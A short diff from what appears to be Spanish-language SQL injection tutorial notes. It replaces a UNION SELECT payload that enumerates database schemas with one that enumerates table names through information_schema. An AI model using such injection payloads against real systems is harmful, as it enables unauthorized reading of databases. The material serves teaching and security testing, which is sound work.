@@ -27,4 +27,4 @@ No siempre se nos pueden volcar todas las bases de datos, por lo cual podemos us
 `' union select 1,schema_name from information_schema.schemata limit 1,1-- -`, donde vamos enumerando uno a uno las bases de datos
 
 Con una base de datos que nos interese podemos acceder a su contenido con
-`' union select 1,schema_name from information_schema.schemata limit 1,1-- -`
+`' union select 1,table_name from information_schema.tables limit 1,1-- -`
